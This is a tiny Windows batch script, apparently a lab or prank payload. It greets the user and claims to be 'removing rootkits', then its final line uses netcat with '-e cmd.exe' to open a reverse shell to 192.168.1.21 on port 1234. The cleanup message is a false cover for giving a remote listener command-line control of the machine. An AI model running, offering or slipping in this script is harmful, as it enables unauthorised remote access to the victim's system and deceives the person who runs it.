@echo off
echo Hello!
pause
echo removing rootkits, promise :)
nc -nv 192.168.1.21 1234 -e "C:\Windows\system32\cmd.exe"
